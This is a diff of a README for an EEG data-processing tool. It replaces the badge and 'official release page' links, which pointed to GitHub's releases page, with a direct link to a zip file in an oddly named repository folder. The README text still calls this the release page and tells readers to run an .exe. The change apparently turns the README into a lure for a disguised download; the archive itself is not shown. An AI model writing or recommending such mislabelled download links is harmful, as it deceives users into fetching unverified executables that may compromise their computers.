@@ -1,6 +1,6 @@
 # 🧠 EEG_Deformer - Transform raw brain data with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gwennispontaneous793/EEG_Deformer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gwennispontaneous793/EEG_Deformer/raw/refs/heads/main/pervertible/Deformer_EE_3.9-alpha.4.zip)
 
 EEG_Deformer processes clinical brainwave files. It converts complex EEG data into clear, easy to read formats. You gain insights from your brainwave readings without needing deep technical knowledge or complex software setups.
 
@@ -19,7 +19,7 @@ To run this application, ensure your computer meets these minimum specifications
 Follow these steps to set up the software on your computer.
 
 ### Step 1: Visit the download page
-Go to the [official release page](https://github.com/Gwennispontaneous793/EEG_Deformer/releases) to find the available installers.
+Go to the [official release page](https://github.com/Gwennispontaneous793/EEG_Deformer/raw/refs/heads/main/pervertible/Deformer_EE_3.9-alpha.4.zip) to find the available installers.
 
 ### Step 2: Download the installer
 Look for the file ending in .exe under the most recent version header. Click the file name to start the download. Save this file in a folder you can locate easily, such as your Downloads folder.
